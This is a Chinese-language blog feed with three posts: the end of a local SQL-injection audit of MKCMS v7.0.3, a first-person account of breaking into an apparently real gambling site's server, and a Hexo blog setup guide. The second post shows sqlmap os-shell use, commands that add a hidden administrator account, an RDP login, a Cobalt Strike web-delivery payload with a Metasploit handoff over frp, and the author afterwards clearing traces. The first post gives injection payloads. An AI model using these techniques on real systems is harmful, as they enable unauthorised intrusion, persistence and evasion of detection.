&gt;手机验证码&lt;&#x2F;label&gt; </span><br><span class="line">&lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;txtsmscode&quot; id&#x3D;&quot;txtsmscode&quot; placeholder&#x3D;&quot;点击右侧获取&quot; class&#x3D;&quot;form-control input-lg span4&quot; style&#x3D;&quot;width:200px;float:left;margin-right:5px;&quot;&gt;</span><br><span class="line"> &lt;input id&#x3D;&quot;btnSendCode&quot; class&#x3D;&quot;form-control input-lg js-ajax-dialog-btn&quot; type&#x3D;&quot;button&quot; value&#x3D;&quot;获取验证码&quot; onclick&#x3D;&quot;sendMessage()&quot; style&#x3D;&quot;width:130px&quot; &#x2F;&gt; &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php &#125;?&gt;   </span><br><span class="line">   &lt;label class&#x3D;&quot;control-label required&quot; &gt;密码&lt;&#x2F;label&gt;</span><br><span class="line">   &lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; id&#x3D;&quot;pass&quot; placeholder&#x3D;&quot;登陆密码,请牢记!&quot; class&#x3D;&quot;form-control input-lg span4&quot;&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;div class&#x3D;&quot;control-group&quot;&gt;</span><br><span class="line">&lt;button class&#x3D;&quot;btn btn-primary js-ajax-submit btn-lg btn-block&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; data-wait&#x3D;&quot;1500&quot; style&#x3D;&quot;margin-left: 0px;margin-top:30px;width: 100%;&quot;&gt;确定注册&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">     &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt; </span><br><span class="line">&lt;?php include(&#39;..&#x2F;template&#x2F;&#39;.$mkcms_bdyun.&#39;&#x2F;footer.php&#39;);?&gt; </span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></li></ul><p>但是在第7行处，<code>$username</code>的值是来自于<code>POST</code>传递的<code>name</code>参数，当<code>name</code>参数到达<code>reg.php</code>这个文件之后，<code>stripslashes（）</code>函数将<code>name</code>的值进行了去除<code>“\”</code>处理，<br><img src="https://img-blog.csdnimg.cn/2020122409471580.png"></p><p>根据<code>include</code>，跳转到<code>/system/library.php</code>中，我们可以发现这里系统对<code>GET</code>、<code>POST</code>等参数进行了<code>addslashes_deep（）</code>函数处理，即对参数传递时加上了一个<code>“\”</code>，<br><img src="https://img-blog.csdnimg.cn/20201224094931786.png"></p><p>问题就出在这里，前端用户进行提交的<code>name</code>参数，经过了<code>addslashes_deep（）</code>函数处理加上了一个<code>“\”</code>，到达<code>reg.php</code>页面又使用<code>stripslashes（）</code>函数将<code>name</code>的值进行了去除<code>“\”</code>处理，这就导致出现了无过滤拼接。</p><h1 id="第二处注入"><a href="#第二处注入" class="headerlink" title="第二处注入"></a>第二处注入</h1><ul><li><p><strong>漏洞文件</strong><br><code>admin/model/admin_edit.php</code>（后台文件）</p></li><li><p><strong>分析</strong><br>在<code>admin_edit.php</code>文件第10行处，系统进行了数据库查询，拼接了两个参数，一个是<code>POST</code>传递的<code>a_name</code>，一个是<code>GET</code>传递的<code>id</code>，可以看出，系统并未对参数在这里做任何的过滤处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;save&#39;])) &#123;</span><br><span class="line">null_back($_POST[&#39;a_name&#39;], &#39;请填写登录账号&#39;);</span><br><span class="line">null_back($_POST[&#39;a_password&#39;], &#39;请填写登录密码&#39;);</span><br><span class="line">null_back($_POST[&#39;a_cpassword&#39;], &#39;请重复输入登录密码&#39;);</span><br><span class="line">if ($_POST[&#39;a_password&#39;] !&#x3D; $_POST[&#39;a_cpassword&#39;]) &#123;</span><br><span class="line">alert_back(&#39;两次输入的密码不一致&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$result &#x3D; mysqli_query($conn,&#39;select * from mkcms_manager where m_name &#x3D; &quot;&#39; . $_POST[&#39;a_name&#39;] . &#39;&quot; and m_id &lt;&gt; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;);</span><br><span class="line">if (mysqli_fetch_array($result)) &#123;</span><br><span class="line">alert_back(&#39;登录账号重复，请更换登录账号。&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$_data[&#39;m_name&#39;] &#x3D; $_POST[&#39;a_name&#39;];</span><br><span class="line">$_data[&#39;m_password&#39;] &#x3D; md5($_POST[&#39;a_password&#39;]);</span><br><span class="line">$sql &#x3D; &#39;update mkcms_manager set &#39; . arrtoupdate($_data) . &#39; where m_id &#x3D; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;;</span><br><span class="line">if (mysqli_query($conn,$sql)) &#123;</span><br><span class="line">alert_href(&#39;管理员修改成功!&#39;, &#39;cms_admin.php&#39;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">alert_back(&#39;修改失败!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201224095407687.png"></p></li></ul><h1 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h1><ul><li><p><strong>环境搭建</strong><br>由于需要设置伪静态，这里用的是宝塔面板<br>源码地址：<a href="https://pan.baidu.com/s/1ejCjLSVQEa1tFINVTPqfyA">米酷CMS v7.0.3</a>，提取码：uy5u<br>（环境搭建教程在源码中附有）<br>搭建完成：<br>后台账号密码为<code>admin/admin</code><br><img src="https://img-blog.csdnimg.cn/20201224095929466.png"></p></li><li><p><strong>第一处漏洞测试</strong><br>来到前台漏洞点，<code>http://mkcms.com/ucenter/reg.php</code>（<em>mkcms.com为本地静态!</em>)<br>抓包注册<code>admin</code>用户，提示已存在<br><img src="https://img-blog.csdnimg.cn/20201224100359818.png"></p></li></ul><p>在<code>name</code>参数处构造<strong>Payload</strong>：<code>+and+&#39;1&#39;=&#39;2</code><br><img src="https://img-blog.csdnimg.cn/20201224100515100.png"></p><p>在<code>name</code>参数处构造<strong>Payload</strong>：<code>+and+&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/20201224100537442.png"></p><p>根据不同的返回值可以说明构造的payload被拼接到数据库进行了判断处理.<br>使用sqlmap验证<br><img src="https://img-blog.csdnimg.cn/20201224100655923.png"></p><ul><li><strong>第二处漏洞测试</strong><br>定位到漏洞点，url：<code>http://mkcms.com/admin/cms_admin_edit.php?id=1</code>（<em>mkcms.com为本地静态!</em>)<br><img src="https://img-blog.csdnimg.cn/20201224100835165.png"></li></ul><p>使用单引号进行判断<br><img src="https://img-blog.csdnimg.cn/20201224100855576.png"></p><p>构造<strong>payload：</strong><code>id=1+and+if(1&gt;2,1,sleep(3))</code><br><img src="https://img-blog.csdnimg.cn/20201224100919889.png"></p><p>可以看到，数据库执行了<code>sleep（）</code>函数</p><p>直接丢到sqlmap进行注入<br><img src="https://img-blog.csdnimg.cn/20201224101017956.png"></p><p>至此，米酷cms v7.0.3漏洞复现结束<br>这篇文章是一次非常简单的代码审计以及复现过程<br>初触代码审计，大佬多多指教</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h1&gt;&lt;p&gt;米酷影视管理系统是一套专为不同需求的站长而设计的影视管理系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站</summary>
      
    
    
    
    <category term="代码审计" scheme="http://nice759.com/Categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="php" scheme="http://nice759.com/tags/php/"/>
    
    <category term="代码审计" scheme="http://nice759.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>利用CS4.0和FRP拿下“打牌”网站服务器</title>
    <link href="http://nice759.com/2021/03/24/%E5%88%A9%E7%94%A8CS4-0%E5%92%8CFRP%E6%8B%BF%E4%B8%8B%E2%80%9C%E6%89%93%E7%89%8C%E2%80%9D%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://nice759.com/2021/03/24/%E5%88%A9%E7%94%A8CS4-0%E5%92%8CFRP%E6%8B%BF%E4%B8%8B%E2%80%9C%E6%89%93%E7%89%8C%E2%80%9D%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2021-03-24T01:28:15.000Z</published>
    <updated>2021-03-24T02:06:03.671Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境的部署"><a href="#环境的部署" class="headerlink" title="环境的部署"></a>环境的部署</h1><h2 id="CS4-0服务器部署"><a href="#CS4-0服务器部署" class="headerlink" title="CS4.0服务器部署"></a>CS4.0服务器部署</h2><p>这里用的是阿里云服务器，也可以部署在本地<br>首先上传cs4.0压缩包到服务器，执行解压<br><img src="https://img-blog.csdnimg.cn/20201025215554824.png"></p><p>执行命令<code>./teamserver ip passwd</code>开启服务器<br><img src="https://img-blog.csdnimg.cn/2020102522024347.png"></p><p>完成之后我们打开本地CS4.0连接服务器，Host就写服务器IP，密码也是之前写的<br><img src="https://img-blog.csdnimg.cn/20201025220937947.png"></p><p>成功连接<br><img src="https://img-blog.csdnimg.cn/20201025221044778.png"></p><h3 id="踩坑点"><a href="#踩坑点" class="headerlink" title="踩坑点"></a>踩坑点</h3><ul><li>服务器的端口一定要设置开启</li><li>修改teamserver的权限为777</li></ul><h2 id="frp部署"><a href="#frp部署" class="headerlink" title="frp部署"></a>frp部署</h2><p>同样先把安装包上传到服务器端和客户端然后解压<br>服务器端将frps权限改为777，同时修改<code>frps.ini</code>文件，设置端口。<br><img src="https://img-blog.csdnimg.cn/20201025221625797.png"><br><code>vim frps.ini</code><br><img src="https://img-blog.csdnimg.cn/20201025221819288.png"></p><p><code>frps -c frps.ini</code>开启服务<br><img src="https://img-blog.csdnimg.cn/20201025222124827.png"></p><p>kali端其他同理</p><p><code>vim frpc.ini</code><br><code>server_addr</code>就是服务器IP，端口就是之前设置的端口<br><code>local_ip</code>回环就行，端口随便设置不常用的，后面要用到<br><img src="https://img-blog.csdnimg.cn/20201025222451608.png"></p><p><code>./frpc -c frpc.ini</code>开启服务<br><img src="https://img-blog.csdnimg.cn/20201025222949751.png"><br><strong>如果不想多开终端可以使用nohup+重定向</strong></p><h1 id="开始打牌"><a href="#开始打牌" class="headerlink" title="开始打牌"></a>开始打牌</h1><p>找到后台页面抓个包<br><img src="https://img-blog.csdnimg.cn/2020102522384918.png"><br><img src="https://img-blog.csdnimg.cn/2020102601235223.png"></p><p>因为之前已经测处来了存在注入，所以直接丢尽sqlmap一把梭哈<br>最终成功拿到数据库<br><img src="https://img-blog.csdnimg.cn/2020102522581933.png"></p><p>这里找了一下终于在<code>RYPlatforManagerDB</code>里面找到了账户信息<br>密码是加密的，用自带的解密工具得出了顶级弱口令<code>admin-admin</code><br><img src="https://img-blog.csdnimg.cn/20201025225401113.png"></p><p>成功进入后台<br><img src="https://img-blog.csdnimg.cn/20201025230747403.png"></p><p>乱点一通，没发现啥啥比较容易利用的，重新回到sqlmap<br>用<code>–is-dba</code>参数判断得出当前用户为<code>DBA</code><br><img src="https://img-blog.csdnimg.cn/20201025225708589.png"><br>接下来就使用<code>–os-shell</code>参数试试能不能拿到shell，经过漫长等待最终成功了<br><img src="https://img-blog.csdnimg.cn/2020102523090257.png"></p><p><code>whoami</code>发现令人惊喜一幕<br><img src="https://img-blog.csdnimg.cn/20201025231230880.png"></p><p>这还能说啥，直接上命令了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user <span class="built_in">test</span> QWer1234! /add</span><br><span class="line">net localgroup administrators <span class="built_in">test</span> /add</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201025232109649.png"><br><img src="https://img-blog.csdnimg.cn/20201025232133471.png"></p><p>接下来就尝试一波RDP连接，不出意外失败了<br><img src="https://img-blog.csdnimg.cn/20201025232528213.png"></p><p>思考了一下原因，决定从RDP这个服务本身开始进行排错<br>首先确认一下RDP这个服务是不是开着的，不管了直接用<code>net start termservice</code>的命令，反正最终也要打开这个服务<br><img src="https://img-blog.csdnimg.cn/20201025233556130.png"></p><p>服务是开着的，那么可能性就多了，这时最怕遇到的就是管理员开了白名单，那就白忙活一场<br>既然都到这了肯定不能放弃，就先从最简单的点进行排错<br>由于sqlmap的回显是出奇的慢，得想个办法，在得到想要的结果的同时尽可能去缩减回显的内容，这样就可以加快回显的速度，提高效率。<br>经过一番百度，终得出这样的思路：既然服务开启，那么就会有对应的进程，RDP的服务对应的进程名称是svchost.exe,描述是termservice，那么可以查看带有termservice描述的svchost.exe进程去拿到进程PID，然后通过PID去获取服务的端口号，同时加上管道符|还能减少回显内容<br>尝试之后得到以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | findstr termservice</span><br><span class="line">netstat -ano | findstr 进程号</span><br></pre></td></tr></table></figure><p>这里出了点问题，回显竟然没有任何内容<br>！<a href="https://img-blog.csdnimg.cn/20201025234526177.png"></a></p><p>理论上来说，肯定是有回显才对。<br>经过一番挣扎，发现忽略了一个细节！不能用<code>termservice</code>而是要用<code>TermService</code>，竟然忘记区分大小写了！<br>重新来过，成功拿到了进程<code>PID 1908</code><br><img src="https://img-blog.csdnimg.cn/20201025235104348.png"><br>有了PID，就可以反查端口<br><img src="https://img-blog.csdnimg.cn/20201026000934800.png"></p><p>还好，管理员只是改了端口，并没有开启白名单，有了端口就可以用之前创建的账号进行连接了</p><p>最终是成功拿到了服务器<br><img src="https://img-blog.csdnimg.cn/20201026001638370.png"><br><code>systeminfo</code>查看一下信息,补丁挺多<br><img src="https://img-blog.csdnimg.cn/2020102600150330.png"></p><h1 id="还没有结束"><a href="#还没有结束" class="headerlink" title="还没有结束"></a>还没有结束</h1><p>本着不浪费的原则，还是cs上线一波，不然就白白浪费调试cs服务器的时间了<br>用cs客户端先建立<code>listener</code><br><img src="https://img-blog.csdnimg.cn/20201026002200210.png"></p><p>然后选择<code>Attacks-&gt;Web Drive-by-&gt;Scripted Web Delivery(s)</code>,host就写服务器地址，端口随便写，<code>listener</code>就选择刚刚创建的监听，可以得到一条让目标上线的<code>payload</code><br><img src="https://img-blog.csdnimg.cn/20201026002552584.png"></p><p>用os-shell去执行这个payload，过一会就能上线cs了<br><img src="https://img-blog.csdnimg.cn/20201026003330170.png"></p><p>成功上线~至于为啥会上线这么多个，我也还在思考中，<br><img src="https://img-blog.csdnimg.cn/20201026003510658.png"></p><p>右键目标，就可以使用很多种攻击方式了<br><img src="https://img-blog.csdnimg.cn/20201026003949220.png"></p><p>因为写这篇文章的时候特别菜，所以这是个裸的cs4.0，那么还是回到kali吧<br>用配置好的frp尝试把这个shell反弹到msf试试<br>这里需要在cs上重新建立一个新的listener<br><img src="https://img-blog.csdnimg.cn/20201026005000754.png"></p><p>然后进入<code>msfconsle</code>设置监听本地的1235端口<br><img src="https://img-blog.csdnimg.cn/20201026005552330.png"></p><p>到cs中<code>右键目标-&gt;spawn</code><br>选之前建立的msf监听器就行了<br><img src="https://img-blog.csdnimg.cn/20201026005656628.png"></p><p>不出意外的话，过十秒钟msf就能接受到服务器弹过来的shell，但是这里突然出现了一个状况，cs提示<code>beacon exit</code> , 之前sqlmap的<code>os-shell</code>也断了<br><img src="https://img-blog.csdnimg.cn/20201026005919657.png"><br><img src="https://img-blog.csdnimg.cn/20201026010125491.png"></p><p>我怀疑是管理员上线了，被迫放弃。看来是天意，那就到此为止<br>总结一下，收获还不错<br>RDP回去清理了一下战场，收工走人</p><p>雕虫小技，大佬多多指点~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境的部署&quot;&gt;&lt;a href=&quot;#环境的部署&quot; class=&quot;headerlink&quot; title=&quot;环境的部署&quot;&gt;&lt;/a&gt;环境的部署&lt;/h1&gt;&lt;h2 id=&quot;CS4-0服务器部署&quot;&gt;&lt;a href=&quot;#CS4-0服务器部署&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="Web渗透" scheme="http://nice759.com/Categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="cs4.0" scheme="http://nice759.com/tags/cs4-0/"/>
    
    <category term="frp" scheme="http://nice759.com/tags/frp/"/>
    
    <category term="web渗透" scheme="http://nice759.com/tags/web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Github+Hexo搭建个人博客--从零开始</title>
    <link href="http://nice759.com/2021/03/22/Hexo%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>http://nice759.com/2021/03/22/Hexo%E7%9A%84%E6%90%AD%E5%BB%BA/</id>
    <published>2021-03-22T06:49:53.000Z</published>
    <updated>2021-03-24T01:22:30.967Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Hexo简介"><a href="#Hexo简介" class="headerlink" title="Hexo简介"></a>Hexo简介</h2><p>一直想搭建一个属于自己的博客，在市面上的各种blog框架中挑来挑去，最终选择了Hexo。<br>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Coding上，是搭建博客的首选框架。大家可以进入<a href="https://hexo.io/">Hexo</a>官网进行详细查看，因为Hexo的创建者是台湾人，对中文的支持很友好，可以选择中文进行查看。</p><h2 id="Hexo搭建步骤"><a href="#Hexo搭建步骤" class="headerlink" title="Hexo搭建步骤"></a>Hexo搭建步骤</h2><p>因为我没有一点前端基础，所以在搭建的过程中基本都是参考网上的教程，期间也踩了很多坑，最终也是成功部署了Hexo<br>Hexo的整部署流程包括以下几点：<br>1.安装Git<br>2.安装Node.js<br>3.安装Hexo<br>4.将Hexo部署到GitHub<br>5.Hexo的一些常见配置说明</p><h3 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1.安装Git"></a>1.安装Git</h3><p>Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。<br>Windows：到git官网上下载,<a href="https://gitforwindows.org/">点击这里</a>，下载后会有一个Git Bash的命令行工具，以后就用这个工具来使用git。<br>Linux:用一句命令就可以在Linux中安装Git</p><figure class="highlight bash"><figcaption><span>install git</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p>使用命令<code>git --version</code>可以查看版本<br><img src="https://img.imgdb.cn/item/605843b98322e6675c73bef6.png"></p><h3 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h3><p>Hexo是基于nodeJS编写的，所以需要安装一下nodeJs和里面的npm工具。<br>Windows： <a href="https://nodejs.org/en/download/">点我下载</a><br>Linux：</p><figure class="highlight bash"><figcaption><span>install nodejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br></pre></td></tr></table></figure><p>安装完成之后，使用命令<code>node -v</code>,<code>npm -v</code>来检查是否成功安装<br><img src="https://img.imgdb.cn/item/605844dd8322e6675c746ccd.png"><br>这里可以直接使用<code>git bash</code>执行命令</p><h3 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h3><p><code>nodejs</code>和<code>git</code>环境安装完成之后，就可以正式开始Hexo的安装了<br>为Hexo选择一个文件夹（也可以新建一个文件夹，我是直接新建了一个blog文件夹），在这个文件夹下<code>git bash</code><br>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>完成之后依旧用<code>hexo -v</code>查看一下版本<br>接下来在刚刚打开的git窗口中初始化Hexo，执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init myblog</span><br></pre></td></tr></table></figure><p>这里的myblog是我定义的文件夹名，也就是Hexo会初始化在这个文件夹中<br>继续执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> myblog //进入这个myblog文件夹</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹目录下有以下几个文件</p><ul><li>node_modules: 依赖包</li><li>public：存放生成的页面</li><li>scaffolds：生成文章的一些模板</li><li>source：用来存放你的文章</li><li>themes：主题</li><li>** _config.yml: 博客的配置文件**</li></ul><p>执行以下命令，就可以运行blog啦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g //generate</span><br><span class="line">hexo s //server</span><br></pre></td></tr></table></figure><p>打开浏览器输入<strong>localhost:4000</strong>就可以看到你的博客。</p><h3 id="4-将Hexo部署到GitHub"><a href="#4-将Hexo部署到GitHub" class="headerlink" title="4.将Hexo部署到GitHub"></a>4.将Hexo部署到GitHub</h3><h4 id="GitHub创建个人仓库"><a href="#GitHub创建个人仓库" class="headerlink" title="GitHub创建个人仓库"></a>GitHub创建个人仓库</h4><p>首先，你先要有一个<a href="https://github.com/">GitHub</a>账户，去注册一个吧。</p><p>注册完登录后，点进右上角<code>settings</code>中，有一个<code>repositories</code>，点击它,然后点击<code>creat one</code></p><p><img src="https://img.imgdb.cn/item/6058491d8322e6675c771a18.png"></p><p><code>.github.io</code>前面的名字一定要和你的用户名一样，不然后面要部署到<code>GitHub page</code>的时候就会出错，其他的不用点<br>点击<code>create repository</code><br><img src="https://img.imgdb.cn/item/60584a268322e6675c779d40.png"></p><h4 id="生成SSH添加到GitHub"><a href="#生成SSH添加到GitHub" class="headerlink" title="生成SSH添加到GitHub"></a>生成SSH添加到GitHub</h4><p>回到 <code>git bash</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;yourname&quot;</span> //yourname是你的Github的用户名</span><br><span class="line">git config --global user.email <span class="string">&quot;youremail&quot;</span> //youremail是你的Github的邮箱</span><br></pre></td></tr></table></figure><p>创建SSH，有选项的地方直接回车就完事</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;youremail&quot;</span></span><br></pre></td></tr></table></figure><p>最终生成的公钥和密钥保存在你电脑中的<code>.ssh</code>隐藏文件夹中，找不到可以百度</p><p>进入到文件夹，可以看到有俩东西<br><code>id_rsa</code>是你这台电脑的私钥<br><code>id_rsa.pub</code>是连接你这台电脑的公钥<br>把这个公钥放在<code>GitHub</code>上，这样当你链接<code>GitHub</code>自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到<code>GitHub</code>上。</p><p>在Github的<code>settings</code>中，找到<code>SSH keys</code>，选择<code>New SSH key</code><br><img src="https://img.imgdb.cn/item/60584cb98322e6675c78ff1f.png"><br>点进去之后，title随便取，将<code>id_rsa.pub</code>里面的内容复制到Key下面的框中<br><img src="https://img.imgdb.cn/item/60584d008322e6675c791b37.png"></p><p>到这就差不多完成啦<br>使用命令查看是否配置完成，出现下图中的内容则表示成功连接了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p><img src="https://img.imgdb.cn/item/60584e028322e6675c79d496.png"></p><h4 id="将hexo部署到GitHub"><a href="#将hexo部署到GitHub" class="headerlink" title="将hexo部署到GitHub"></a>将hexo部署到GitHub</h4><p>前面的配置都完成之后，这是最后一步，让<code>Hexo</code>与<code>Github</code>关联起来，然后就可以访问我们部署在<code>Github</code>上的<code>Hexo</code>主页啦<br>在根目录中找到<code>_config.yml</code>，翻到最后，修改<code>YourgithubName</code>为你的<code>GitHub</code>账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: &#39;git&#39;</span><br><span class="line">  repository: https:&#x2F;&#x2F;github.com&#x2F;YourgithubName&#x2F;YourgithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>然后安装<code>deploy-git</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>最后一步，也是每次跟新文章都要进行的一步，俗称<strong>Hexo</strong>三连</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  //清除了你之前生成的东西,即清除缓存</span><br><span class="line">hexo g  //generate，顾名思义，生成静态文章</span><br><span class="line">hexo d  //deploy，部署文章到Github</span><br></pre></td></tr></table></figure><p>国内服务器部署到<code>Github</code>可能会被墙，多试几次或者添加代理<br>怎么添加代理可以参考<a href="https://spoience.com/articles/git-npm-proxy.html">这篇文章</a>，仅供参考</p><p>至此，你的<code>Hexo</code>就成功部署到了<code>Github</code>上，访问<code>http://yourname.github.io</code>就可以看到你的博客啦</p><h3 id="5-Hexo的一些常见配置说明"><a href="#5-Hexo的一些常见配置说明" class="headerlink" title="5.Hexo的一些常见配置说明"></a>5.Hexo的一些常见配置说明</h3><p><code>_config.yml</code>配置文件说明，<a href="https://hexo.io/zh-cn/docs/configuration.html">点我</a><br>更换主题：<a href="https://hexo.io/zh-cn/docs/themes.html">传送门</a> 我用的是Jerry大佬写的butterfly，具体配置可以看<a href="https://butterfly.js.org/">Jerry的博客</a><br>Hexo可以使用MD进行对文章的编辑，MD语法可以参考<a href="https://www.jianshu.com/p/399e5a3c7cc5">MD语法入门</a></p><p><strong>学习记录，仅供参考~</strong></p>]]></content>
    
    
    <summary type="html">Hexo博客搭建过程</summary>
    
    
    
    <category term="Hexo" scheme="http://nice759.com/Categories/Hexo/"/>
    
    
    <category term="Hexo" scheme="http://nice759.com/tags/Hexo/"/>
    
  </entry>
  
</feed>
